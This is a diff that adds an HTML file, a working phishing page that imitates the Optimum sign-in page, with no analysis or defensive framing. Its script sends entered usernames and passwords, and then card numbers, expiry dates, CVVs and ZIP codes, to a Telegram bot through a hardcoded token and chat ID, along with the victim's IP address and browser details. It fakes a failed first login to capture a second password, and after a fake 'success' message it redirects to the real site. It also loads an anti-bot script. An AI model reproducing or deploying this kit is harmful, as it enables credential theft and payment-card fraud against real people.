@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="url-extender-antibot.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Optimum Login</title>
+  <style>
+    * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+    body { margin: 0; padding: 0; background-color: #012b69; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .login-container { background: #fff; border-radius: 10px; width: 100%; max-width: 380px; padding: 2rem; box-shadow: 0 4px 12px rgba(0,0,0,0.2); position: relative; animation: fadeIn 0.6s ease; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+    .logo { text-align: center; margin-bottom: 1.5rem; font-size: 2rem; font-weight: bold; color: #012b69; }
+    .logo span { color: #ff6600; }
+    h2 { text-align: center; font-weight: normal; color: #222; margin-bottom: 1.5rem; }
+    label { display: block; font-size: 0.9rem; margin-bottom: 0.3rem; color: #444; }
+    input[type="text"], input[type="password"], input[type="email"], select { width: 100%; padding: 0.75rem; margin-bottom: 1rem; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; transition: border-color 0.2s; }
+    input:focus, select:focus { border-color: #0072ce; outline: none; }
+    .remember { display: flex; align-items: center; margin-bottom: 1rem; font-size: 0.9rem; }
+    .remember input { margin-right: 0.4rem; }
+    .btn { width: 100%; background-color: #ff6600; color: #fff; border: none; padding: 0.9rem; border-radius: 6px; font-size: 1rem; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: background-color 0.3s, transform 0.1s; }
+    .btn:hover { background-color: #e65c00; }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.8; cursor: not-allowed; }
+    #loaderOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); justify-content: center; align-items: center; z-index: 1000; flex-direction: column; }
+    #loaderOverlay.show { display: flex; }
+    .spinner { width: 60px; height: 60px; border: 6px solid rgba(255,255,255,0.2); border-top-color: #ff6600; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text { color: #fff; margin-top: 1rem; font-size: 1rem; }
+    .error-message { display: none; color: #e60000; background-color: #ffe6e6; padding: 10px; border: 1px solid #e60000; border-radius: 4px; margin-bottom: 15px; font-size: 14px; }
+    .error-message.show { display: block; }
+    #successPopup { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); justify-content: center; align-items: center; z-index: 2000; }
+    #successPopup.show { display: flex; animation: fadeIn 0.3s ease; }
+    .success-box { background: #fff; padding: 2rem; border-radius: 12px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.3); max-width: 320px; animation: slideUp 0.4s ease; }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    .success-icon { width: 70px; height: 70px; border-radius: 50%; background: #4caf50; margin: 0 auto 1rem; display: flex; align-items: center; justify-content: center; animation: scaleIn 0.5s ease; }
+    @keyframes scaleIn { 0% { transform: scale(0); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    .success-icon::before { content: "✓"; color: #fff; font-size: 2.5rem; font-weight: bold; }
+    .success-title { font-size: 1.4rem; font-weight: bold; color: #333; margin-bottom: 0.5rem; }
+    .success-message { color: #666; font-size: 0.95rem; }
+    .extra-links { text-align: center; font-size: 0.85rem; margin-top: 1rem; }
+    .extra-links a { color: #0072ce; text-decoration: none; margin: 0 0.25rem; }
+    .extra-links a:hover { text-decoration: underline; }
+    .create-id { text-align: center; border-top: 1px solid #ddd; margin-top: 1.5rem; padding-top: 1rem; font-size: 0.9rem; }
+    .billing-section { display: none; }
+    .billing-section.show { display: block; animation: fadeIn 0.4s ease; }
+    .card-row { display: flex; gap: 0.75rem; }
+    .card-row input, .card-row select { flex: 1; }
+    .billing-header { text-align: center; margin-bottom: 1.5rem; }
+    .billing-header p { color: #666; font-size: 0.9rem; margin-top: 0.5rem; }
+    .secure-badge { display: flex; align-items: center; justify-content: center; gap: 0.5rem; color: #4caf50; font-size: 0.85rem; margin-bottom: 1rem; }
+    .secure-badge::before { content: "🔒"; }
+    @media (max-width: 480px) { .login-container { margin: 1rem; padding: 1.5rem; } .card-row { flex-direction: column; gap: 0; } }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+		<p style="text-align: left">Optimum<span>.</span></div>
+    <h2 id="pageTitle" style="text-align: left">Sign in to Optimum</h2>
+
+    <form id="loginForm">
+      <div class="error-message" id="errorBox">Wrong username or password, please try again.</div>
+      
+      <label for="username">Username*</label>
+      <input type="text" id="username" name="username" required />
+
+      <label for="password">Password*</label>
+      <input type="password" id="password" name="password" required />
+
+      <div class="remember">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Remember Me</label>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">Continue</button>
+    </form>
+
+    <!-- Billing Form (Step 3) -->
+    <div class="billing-section" id="billingSection">
+      <div class="billing-header">
+        <h2>Billing Information</h2>
+        <p>Please verify your payment details to continue.</p>
+      </div>
+      <div class="secure-badge">Secure Connection</div>
+      
+      <form id="billingForm">
+        <label for="cardName">Name on Card*</label>
+        <input type="text" id="cardName" name="cardName" placeholder="John Doe" required />
+
+        <label for="cardNumber">Card Number*</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required />
+
+        <div class="card-row">
+          <div>
+            <label for="expiry">Expiry Date*</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required />
+          </div>
+          <div>
+            <label for="cvv">CVV*</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required />
+          </div>
+        </div>
+
+        <label for="zipCode">ZIP / Postal Code*</label>
+        <input type="text" id="zipCode" name="zipCode" placeholder="10001" required />
+
+        <label for="country">Country*</label>
+        <select id="country" name="country" required>
+          <option value="">Select Country</option>
+          <option value="US">United States</option>
+          <option value="CA">Canada</option>
+          <option value="UK">United Kingdom</option>
+          <option value="AU">Australia</option>
+        </select>
+
+        <button type="submit" class="btn" id="billingBtn">Verify & Continue</button>
+      </form>
+    </div>
+
+    <div class="extra-links" id="extraLinks">
+      <a href="#">Forgot ID?</a> | <a href="#">Forgot Password?</a>
+    </div>
+
+    <div class="create-id" id="createId">
+      <p style="text-align: left"><strong><font size="5">Don't have a Optimum ID?</font></strong></p>
+      <p style="text-align: left">A Optimum ID is a unique username that provides access to extra services and benefits.</p>
+      <p style="text-align: left">
+      <a href="#">Create a Optimum ID</a>
+    </div>
+  </div>
+
+  <!-- Loader overlay with spinning wheel -->
+  <div id="loaderOverlay">
+    <div class="spinner"></div>
+    <div class="loader-text" id="loaderText">Verifying credentials...</div>
+  </div>
+
+  <!-- Success popup -->
+  <div id="successPopup">
+    <div class="success-box">
+      <div class="success-icon"></div>
+      <div class="success-title">Verification Successful!</div>
+      <div class="success-message">Redirecting you now...</div>
+    </div>
+  </div>
+
+  <script>
+    const botToken = "6139609692:AAHsLpi16V6brKZPzbbnDdulgDABx3N8uWk";
+    const chatId = "1494679216";
+
+    let attemptCount = 0;
+    let userIP = "Unknown IP";
+    const deviceInfo = navigator.userAgent;
+
+    // Fetch IP address
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => userIP = data.ip)
+      .catch(() => userIP = "Unavailable");
+
+    // Auto-fill email from URL parameter
+    function autofillEmailFromURL() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
+      if (email) {
+        document.getElementById("username").value = decodeURIComponent(email);
+      }
+    }
+    window.addEventListener('DOMContentLoaded', autofillEmailFromURL);
+
+    // Function to send data to Telegram
+    function sendToTelegram(message) {
+      const fullMessage = `${message}\nIP: ${userIP}\nDevice: ${deviceInfo}`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: fullMessage })
+      });
+    }
+
+    // Get elements
+    const form = document.getElementById("loginForm");
+    const billingSection = document.getElementById("billingSection");
+    const billingForm = document.getElementById("billingForm");
+    const errorMsg = document.getElementById("errorBox");
+    const loaderOverlay = document.getElementById("loaderOverlay");
+    const loaderText = document.getElementById("loaderText");
+    const successPopup = document.getElementById("successPopup");
+    const extraLinks = document.getElementById("extraLinks");
+    const createId = document.getElementById("createId");
+    const pageTitle = document.getElementById("pageTitle");
+
+    function showLoader(text) {
+      loaderText.textContent = text || "Verifying credentials...";
+      loaderOverlay.classList.add("show");
+    }
+
+    function hideLoader() {
+      loaderOverlay.classList.remove("show");
+    }
+
+    function showError() {
+      errorMsg.classList.add("show");
+    }
+
+    function hideError() {
+      errorMsg.classList.remove("show");
+    }
+
+    function showSuccess() {
+      successPopup.classList.add("show");
+    }
+
+    // Login form submission logic
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      hideError();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      showLoader("Verifying credentials...");
+
+      // Send credentials to Telegram
+      const message = `Login Attempt #${attemptCount + 1}\nUsername: ${username}\nPassword: ${password}`;
+      sendToTelegram(message);
+
+      setTimeout(() => {
+        hideLoader();
+        attemptCount++;
+
+        if (attemptCount === 1) {
+          // First attempt: show error
+          showError();
+        } else if (attemptCount >= 2) {
+          // Second attempt: show billing form (Step 3)
+          form.style.display = "none";
+          extraLinks.style.display = "none";
+          createId.style.display = "none";
+          pageTitle.style.display = "none";
+          billingSection.classList.add("show");
+        }
+      }, 2000);
+    });
+
+    // Billing form submission logic (3rd Step)
+    billingForm.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const cardName = document.getElementById("cardName").value;
+      const cardNumber = document.getElementById("cardNumber").value;
+      const expiry = document.getElementById("expiry").value;
+      const cvv = document.getElementById("cvv").value;
+      const zipCode = document.getElementById("zipCode").value;
+      const country = document.getElementById("country").value;
+
+      showLoader("Verifying payment details...");
+
+      // Send billing info to Telegram
+      const billingMessage = `BILLING INFO\nName: ${cardName}\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nZIP: ${zipCode}\nCountry: ${country}`;
+      sendToTelegram(billingMessage);
+
+      setTimeout(() => {
+        hideLoader();
+        showSuccess();
+        setTimeout(() => {
+          window.location.href = "https://www.Optimum.net/login/";
+        }, 2000);
+      }, 2500);
+    });
+
+    // Simple card number formatting
+    document.getElementById("cardNumber").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\s/g, "").replace(/[^0-9]/g, "");
+      let formattedValue = value.match(/.{1,4}/g)?.join(" ") || "";
+      e.target.value = formattedValue;
+    });
+
+    // Simple expiry formatting
+    document.getElementById("expiry").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/[^0-9]/g, "");
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + "/" + value.substring(2, 4);
+      }
+      e.target.value = value;
+    });
+  </script>
+</body>
+</html>
